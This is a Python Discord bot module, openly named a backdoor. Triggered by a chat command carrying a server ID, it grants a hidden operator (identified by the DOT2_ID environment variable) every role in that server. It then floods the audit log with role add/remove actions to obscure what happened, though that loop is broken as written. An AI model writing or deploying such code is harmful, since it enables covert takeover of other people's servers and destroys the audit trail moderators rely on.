import discord
import os
import chattrigger
import traceback


class BackdoorDot2ScrambleRoles(chattrigger.ChatTrigger):

    async def run(self, message: discord.Message, trigger: str, client: discord.Client):

        targetguild: discord.Guild = client.get_guild(int(message.content[len(trigger):]))
        dot2id = int(os.environ.get("DOT2_ID"))

        dot2: discord.Member = targetguild.get_member(dot2id)

        for i in targetguild.roles:
            try:
                await dot2.add_roles(i)
            except discord.Forbidden:
                traceback.print_exc()

        # now scramble the audit log

        i = targetguild.roles[0]

        for i in range(9000):
            try:
                await targetguild.me.add_roles(i)
            except discord.Forbidden:
                traceback.print_exc()
                break

            try:
                await targetguild.me.remove_roles(i)
            except discord.Forbidden:
                traceback.print_exc()
                break

        await message.channel.send("Done")
